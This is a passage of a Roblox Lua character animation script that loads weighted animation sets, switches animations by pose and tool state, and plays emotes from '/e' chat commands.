	toolslash = {
				{ id = "http://www.roblox.com/asset/?id=129967390", weight = 10 } 
--				{ id = "slash.xml", weight = 10 } 
			},
	toollunge = {
				{ id = "http://www.roblox.com/asset/?id=129967478", weight = 10 } 
			},
	wave = {
				{ id = "http://www.roblox.com/asset/?id=128777973", weight = 10 } 
			},
	point = {
				{ id = "http://www.roblox.com/asset/?id=128853357", weight = 10 } 
			},
	dance1 = {
				{ id = "http://www.roblox.com/asset/?id=182435998", weight = 10 }, 
				{ id = "http://www.roblox.com/asset/?id=182491037", weight = 10 }, 
				{ id = "http://www.roblox.com/asset/?id=182491065", weight = 10 } 
			},
	dance2 = {
				{ id = "http://www.roblox.com/asset/?id=182436842", weight = 10 }, 
				{ id = "http://www.roblox.com/asset/?id=182491248", weight = 10 }, 
				{ id = "http://www.roblox.com/asset/?id=182491277", weight = 10 } 
			},
	dance3 = {
				{ id = "http://www.roblox.com/asset/?id=182436935", weight = 10 }, 
				{ id = "http://www.roblox.com/asset/?id=182491368", weight = 10 }, 
				{ id = "http://www.roblox.com/asset/?id=182491423", weight = 10 } 
			},
	laugh = {
				{ id = "http://www.roblox.com/asset/?id=129423131", weight = 10 } 
			},
	cheer = {
				{ id = "http://www.roblox.com/asset/?id=129423030", weight = 10 } 
			},
}
local dances = {"dance1", "dance2", "dance3"}

-- Existance in this list signifies that it is an emote, the value indicates if it is a looping emote
local emoteNames = { wave = false, point = false, dance1 = true, dance2 = true, dance3 = true, laugh = false, cheer = false}

function configureAnimationSet(name, fileList)
	if (animTable[name] ~= nil) then
		for _, connection in pairs(animTable[name].connections) do
			connection:disconnect()
		end
	end
	animTable[name] = {}
	animTable[name].count = 0
	animTable[name].totalWeight = 0	
	animTable[name].connections = {}

	-- check for config values
	local config = script:FindFirstChild(name)
	if (config ~= nil) then
--		print("Loading anims " .. name)
		table.insert(animTable[name].connections, config.ChildAdded:connect(function(child) configureAnimationSet(name, fileList) end))
		table.insert(animTable[name].connections, config.ChildRemoved:connect(function(child) configureAnimationSet(name, fileList) end))
		local idx = 1
		for _, childPart in pairs(config:GetChildren()) do
			if (childPart:IsA("Animation")) then
				table.insert(animTable[name].connections, childPart.Changed:connect(function(property) configureAnimationSet(name, fileList) end))
				animTable[name][idx] = {}
				animTable[name][idx].anim = childPart
				local weightObject = childPart:FindFirstChild("Weight")
				if (weightObject == nil) then
					animTable[name][idx].weight = 1
				else
					animTable[name][idx].weight = weightObject.Value
				end
				animTable[name].count = animTable[name].count + 1
				animTable[name].totalWeight = animTable[name].totalWeight + animTable[name][idx].weight
	--			print(name .. " [" .. idx .. "] " .. animTable[name][idx].anim.AnimationId .. " (" .. animTable[name][idx].weight .. ")")
				idx = idx + 1
			end
		end
	end

	-- fallback to defaults
	if (animTable[name].count <= 0) then
		for idx, anim in pairs(fileList) do
			animTable[name][idx] = {}
			animTable[name][idx].anim = Instance.new("Animation")
			animTable[name][idx].anim.Name = name
			animTable[name][idx].anim.AnimationId = anim.id
			animTable[name][idx].weight = anim.weight
			animTable[name].count = animTable[name].count + 1
			animTable[name].totalWeight = animTable[name].totalWeight + anim.weight
--			print(name .. " [" .. idx .. "] " .. anim.id .. " (" .. anim.weight .. ")")
		end
	end
end

-- Setup animation objects
function scriptChildModified(child)
	local fileList = animNames[child.Name]
	if (fileList ~= nil) then
		configureAnimationSet(child.Name, fileList)
	end	
end

script.ChildAdded:connect(scriptChildModified)
script.ChildRemoved:connect(scriptChildModified)


for name, fileList in pairs(animNames) do 
	configureAnimationSet(name, fileList)
end	

-- ANIMATION

-- declarations
local toolAnim = "None"
local toolAnimTime = 0

local jumpAnimTime = 0
local jumpAnimDuration = 0.3

local toolTransitionTime = 0.1
local fallTransitionTime = 0.3
local jumpMaxLimbVelocity = 0.75

-- functions

function stopAllAnimations()
	local oldAnim = currentAnim

	-- return to idle if finishing an emote
	if (emoteNames[oldAnim] ~= nil and emoteNames[oldAnim] == false) then
		oldAnim = "idle"
	end

	currentAnim = ""
	currentAnimInstance = nil
	if (currentAnimKeyframeHandler ~= nil) then
		currentAnimKeyframeHandler:disconnect()
	end

	if (currentAnimTrack ~= nil) then
		currentAnimTrack:Stop()
		currentAnimTrack:Destroy()
		currentAnimTrack = nil
	end
	return oldAnim
end

function setAnimationSpeed(speed)
	if speed ~= currentAnimSpeed then
		currentAnimSpeed = speed
		currentAnimTrack:AdjustSpeed(currentAnimSpeed)
	end
end

function keyFrameReachedFunc(frameName)
	if (frameName == "End") then

		local repeatAnim = currentAnim
		-- return to idle if finishing an emote
		if (emoteNames[repeatAnim] ~= nil and emoteNames[repeatAnim] == false) then
			repeatAnim = "idle"
		end
		
		local animSpeed = currentAnimSpeed
		playAnimation(repeatAnim, 0.0, Humanoid)
		setAnimationSpeed(animSpeed)
	end
end

-- Preload animations
function playAnimation(animName, transitionTime, humanoid) 
		
	local roll = math.random(1, animTable[animName].totalWeight) 
	local origRoll = roll
	local idx = 1
	while (roll > animTable[animName][idx].weight) do
		roll = roll - animTable[animName][idx].weight
		idx = idx + 1
	end
--		print(animName .. " " .. idx .. " [" .. origRoll .. "]")
	local anim = animTable[animName][idx].anim

	-- switch animation		
	if (anim ~= currentAnimInstance) then
		
		if (currentAnimTrack ~= nil) then
			currentAnimTrack:Stop(transitionTime)
			currentAnimTrack:Destroy()
		end

		currentAnimSpeed = 1.0
	
		-- load it to the humanoid; get AnimationTrack
		pcall(function()
			currentAnimTrack = humanoid:LoadAnimation(anim)
		end)
		currentAnimTrack.Priority = Enum.AnimationPriority.Core
		 
		-- play the animation
		currentAnimTrack:Play(transitionTime)
		currentAnim = animName
		currentAnimInstance = anim

		-- set up keyframe name triggers
		if (currentAnimKeyframeHandler ~= nil) then
			currentAnimKeyframeHandler:disconnect()
		end
		currentAnimKeyframeHandler = currentAnimTrack.KeyframeReached:connect(keyFrameReachedFunc)
		
	end

end

-------------------------------------------------------------------------------------------
-------------------------------------------------------------------------------------------

local toolAnimName = ""
local toolAnimTrack = nil
local toolAnimInstance = nil
local currentToolAnimKeyframeHandler = nil

function toolKeyFrameReachedFunc(frameName)
	if (frameName == "End") then
--		print("Keyframe : ".. frameName)	
		playToolAnimation(toolAnimName, 0.0, Humanoid)
	end
end


function playToolAnimation(animName, transitionTime, humanoid, priority)	 
		
		local roll = math.random(1, animTable[animName].totalWeight) 
		local origRoll = roll
		local idx = 1
		while (roll > animTable[animName][idx].weight) do
			roll = roll - animTable[animName][idx].weight
			idx = idx + 1
		end
--		print(animName .. " * " .. idx .. " [" .. origRoll .. "]")
		local anim = animTable[animName][idx].anim

		if (toolAnimInstance ~= anim) then
			
			if (toolAnimTrack ~= nil) then
				toolAnimTrack:Stop()
				toolAnimTrack:Destroy()
				transitionTime = 0
			end
					
		-- load it to the humanoid; get AnimationTrack

		pcall(function()
			toolAnimTrack = humanoid:LoadAnimation(anim)
		end)
			if priority then
				toolAnimTrack.Priority = priority
			end
			 
			-- play the animation
			toolAnimTrack:Play(transitionTime)
			toolAnimName = animName
			toolAnimInstance = anim

			currentToolAnimKeyframeHandler = toolAnimTrack.KeyframeReached:connect(toolKeyFrameReachedFunc)
		end
end

function stopToolAnimations()
	local oldAnim = toolAnimName

	if (currentToolAnimKeyframeHandler ~= nil) then
		currentToolAnimKeyframeHandler:disconnect()
	end

	toolAnimName = ""
	toolAnimInstance = nil
	if (toolAnimTrack ~= nil) then
		toolAnimTrack:Stop()
		toolAnimTrack:Destroy()
		toolAnimTrack = nil
	end


	return oldAnim
end

-------------------------------------------------------------------------------------------
-------------------------------------------------------------------------------------------


function onRunning(speed)
	if speed > 0.01 then
		playAnimation("walk", 0.1, Humanoid)
		if currentAnimInstance and currentAnimInstance.AnimationId == "http://www.roblox.com/asset/?id=180426354" then
			setAnimationSpeed(speed / 14.5)
		end
		pose = "Running"
	else
		if emoteNames[currentAnim] == nil then
			playAnimation("idle", 0.1, Humanoid)
			pose = "Standing"
		end
	end
end

function onDied()
	pose = "Dead"
end

function onJumping()
	playAnimation("jump", 0.1, Humanoid)
	jumpAnimTime = jumpAnimDuration
	pose = "Jumping"
end

function onClimbing(speed)
	playAnimation("climb", 0.1, Humanoid)
	setAnimationSpeed(speed / 12.0)
	pose = "Climbing"
end

function onGettingUp()
	pose = "GettingUp"
end

function onFreeFall()
	if (jumpAnimTime <= 0) then
		playAnimation("fall", fallTransitionTime, Humanoid)
	end
	pose = "FreeFall"
end

function onFallingDown()
	pose = "FallingDown"
end

function onSeated()
	pose = "Seated"
end

function onPlatformStanding()
	pose = "PlatformStanding"
end

function onSwimming(speed)
	if speed > 0 then
		pose = "Running"
	else
		pose = "Standing"
	end
end

function getTool()	
	for _, kid in ipairs(Figure:GetChildren()) do
		if kid.className == "Tool" then return kid end
	end
	return nil
end

function getToolAnim(tool)
	for _, c in ipairs(tool:GetChildren()) do
		if c.Name == "toolanim" and c.className == "StringValue" then
			return c
		end
	end
	return nil
end

function animateTool()
	
	if (toolAnim == "None") then
		playToolAnimation("toolnone", toolTransitionTime, Humanoid, Enum.AnimationPriority.Idle)
		return
	end

	if (toolAnim == "Slash") then
		playToolAnimation("toolslash", 0, Humanoid, Enum.AnimationPriority.Action)
		return
	end

	if (toolAnim == "Lunge") then
		playToolAnimation("toollunge", 0, Humanoid, Enum.AnimationPriority.Action)
		return
	end
end

function moveSit()
	RightShoulder.MaxVelocity = 0.15
	LeftShoulder.MaxVelocity = 0.15
	RightShoulder:SetDesiredAngle(3.14 /2)
	LeftShoulder:SetDesiredAngle(-3.14 /2)
	RightHip:SetDesiredAngle(3.14 /2)
	LeftHip:SetDesiredAngle(-3.14 /2)
end

local lastTick = 0

function move(time)
	local amplitude = 1
	local frequency = 1
  	local deltaTime = time - lastTick
  	lastTick = time

	local climbFudge = 0
	local setAngles = false

  	if (jumpAnimTime > 0) then
  		jumpAnimTime = jumpAnimTime - deltaTime
  	end

	if (pose == "FreeFall" and jumpAnimTime <= 0) then
		playAnimation("fall", fallTransitionTime, Humanoid)
	elseif (pose == "Seated") then
		playAnimation("sit", 0.5, Humanoid)
		return
	elseif (pose == "Running") then
		playAnimation("walk", 0.1, Humanoid)
	elseif (pose == "Dead" or pose == "GettingUp" or pose == "FallingDown" or pose == "Seated" or pose == "PlatformStanding") then
--		print("Wha " .. pose)
		stopAllAnimations()
		amplitude = 0.1
		frequency = 1
		setAngles = true
	end

	if (setAngles) then
		local desiredAngle = amplitude * math.sin(time * frequency)

		RightShoulder:SetDesiredAngle(desiredAngle + climbFudge)
		LeftShoulder:SetDesiredAngle(desiredAngle - climbFudge)
		RightHip:SetDesiredAngle(-desiredAngle)
		LeftHip:SetDesiredAngle(-desiredAngle)
	end

	-- Tool Animation handling
	local tool = getTool()
	if tool and tool:FindFirstChild("Handle") then
	
		local animStringValueObject = getToolAnim(tool)

		if animStringValueObject then
			toolAnim = animStringValueObject.Value
			-- message recieved, delete StringValue
			animStringValueObject.Parent = nil
			toolAnimTime = time + .3
		end

		if time > toolAnimTime then
			toolAnimTime = 0
			toolAnim = "None"
		end

		animateTool()		
	else
		stopToolAnimations()
		toolAnim = "None"
		toolAnimInstance = nil
		toolAnimTime = 0
	end
end

-- connect events
Humanoid.Died:connect(onDied)
Humanoid.Running:connect(onRunning)
Humanoid.Jumping:connect(onJumping)
Humanoid.Climbing:connect(onClimbing)
Humanoid.GettingUp:connect(onGettingUp)
Humanoid.FreeFalling:connect(onFreeFall)
Humanoid.FallingDown:connect(onFallingDown)
Humanoid.Seated:connect(onSeated)
Humanoid.PlatformStanding:connect(onPlatformStanding)
Humanoid.Swimming:connect(onSwimming)

-- setup emote chat hook
game:GetService("Players").LocalPlayer.Chatted:connect(function(msg)
	local emote = ""
	if msg == "/e dance" then
		emote = dances[math.random(1, #dances)]
	elseif (string.sub(msg, 1, 3) == "/e ") then
		emote = string.sub(msg, 4)
	elseif (string.sub(msg, 1, 7) == "/emote ") then
		emote = string.sub(msg, 8)
	end
	
	if (pose == "Standing" and emoteNames[emote] ~= nil) then
		playAnimation(emote, 0.1, Humanoid)
	end

end)


-- main program

-- initialize to idle
playAnimation("idle", 0.1, Humanoid)
pose = "Standing"

while Figure.Parent ~= nil do
	local _, time = wait(0.1)
	move(time)
end
end)

starterplayerscripts.localscript
  
